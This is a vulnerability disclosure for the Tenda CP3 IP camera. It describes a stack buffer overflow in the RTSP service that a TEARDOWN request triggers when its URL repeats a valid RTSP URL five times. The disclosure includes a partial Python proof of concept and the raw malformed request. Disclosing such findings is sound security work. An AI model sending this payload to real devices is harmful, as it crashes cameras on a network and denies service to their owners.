# Tenda CP3 RTSP Service Stack Buffer Overflow via Repeated URL Concatenation in TEARDOWN Request
...
A stack-based buffer overflow vulnerability exists in the RTSP service of the Tenda CP3 IP camera. When processing a `TEARDOWN` request, the RTSP service applies a two-stage URL validation mechanism: the first stage performs format checking and rejects malformed inputs with a `400 Bad Request` response; the second stage performs URL routing and path extraction on inputs that pass the first stage. The second-stage parsing logic, however, lacks sufficient length validation on the URL field. By constructing a `TEARDOWN` request URL consisting of exactly five consecutive repetitions of a valid RTSP URL, an attacker can bypass the first-stage format check and trigger a stack buffer overflow during second-stage route parsing, causing an immediate crash of the RTSP service process.

The vulnerability requires no authentication credentials — only network access to the device's LAN segment is necessary. Exploitation requires completing the `OPTIONS`, `DESCRIBE`, two legitimate `SETUP` requests, and a legitimate `PLAY` request to establish a fully active RTSP session, after which the malformed `TEARDOWN` request can be sent to trigger the overflow. Upon receiving the malformed request, the RTSP service process crashes immediately, causing TCP port 554 to stop accepting connections. All clients on the local network — including the official Tenda app and third-party players such as VLC — are unable to connect to the device. Beyond denial of service, the stack-based nature of the overflow presents a potential attack surface for remote code execution (RCE).
...
#!/usr/bin/env python3
"""
PoC for Stack-Based Buffer Overflow in Tenda CP3 RTSP Service (TEARDOWN Request)

This proof-of-concept reproduces a denial-of-service vulnerability by completing
a legitimate RTSP handshake (OPTIONS, DESCRIBE, two valid SETUP requests, and a
legitimate PLAY request) to establish a fully active RTSP session, then sending
a malformed TEARDOWN request whose URL field consists of exactly five consecutive
...
Usage:
  python3 poc_tenda_cp3_rtsp_teardown.py
...
# 5. PLAY (legitimate)
play_req = (
    f"PLAY rtsp://{CAMERA_IP}/ch=1?subtype=0/ RTSP/1.0\r\n"
    f"CSeq: 6\r\n"
    f"User-Agent: LibVLC/3.0.20 (LIVE555 Streaming Media v2016.11.28)\r\n"
    f"Session: {session_id}\r\n"
    f"Range: npt=0.000-\r\n\r\n"
...
# 6. TEARDOWN (malformed URL: five consecutive repetitions of a valid RTSP URL)
...
teardown_req = (
    f"TEARDOWN {malformed_url} RTSP/1.0\r\n"
    f"CSeq: 7\r\n"
    f"User-Agent: LibVLC/3.0.20 (LIVE555 Streaming Media v2016.11.28)\r\n"
    f"Session: {session_id}\r\n\r\n"
)
...
time.sleep(1)
teardown_res = recv_rtsp_response(s)
print("TEARDOWN Response:\n", teardown_res.decode(errors="ignore"))
check_service_alive(CAMERA_IP, RTSP_PORT, label="after TEARDOWN")
...
The vulnerability can be triggered by sending a malformed RTSP `TEARDOWN` request. After completing the `OPTIONS`, `DESCRIBE`, two legitimate `SETUP` requests, and a legitimate `PLAY` request to establish a fully active RTSP session, an attacker sends a `TEARDOWN` request whose URL field consists of exactly five consecutive repetitions of a valid RTSP URL. This input bypasses the first-stage format validation and triggers a stack buffer overflow in the second-stage route parsing logic. The RTSP service process crashes immediately upon receiving the malformed request, causing TCP port 554 to stop responding (`ConnectionRefusedError`), and all clients on the local network lose access to the device.

![image-20260502193942243](images/image-20260502193942243.png)

![image-20260502193955048](images/image-20260502193955048.png)

![image-20260502194023547](images/image-20260502194023547.png)
...
TEARDOWN rtsp://<IP>/ch=1?subtype=0/rtsp://<IP>/ch=1?subtype=0/rtsp://<IP>/ch=1?subtype=0/rtsp://<IP>/ch=1?subtype=0/rtsp://<IP>/ch=1?subtype=0/ RTSP/1.0
CSeq: 7
User-Agent: LibVLC/3.0.20 (LIVE555 Streaming Media v2016.11.28)
Session: <session_id>
# The TEARDOWN request URL is constructed by concatenating exactly five repetitions of a valid RTSP URL,
...
https://github.com/izxnfirh8148/CVE_REQUESTS_references/releases/tag/Tenda_CP3V3.0_7th

## Supplement

This vulnerability allows an unauthenticated attacker with LAN access to trigger a denial-of-service (DoS) condition on the affected device. By sending a malformed RTSP `TEARDOWN` request whose URL consists of exactly five consecutive repetitions of a valid RTSP URL, a stack buffer overflow is triggered during second-stage route parsing, resulting in an immediate RTSP service process crash.
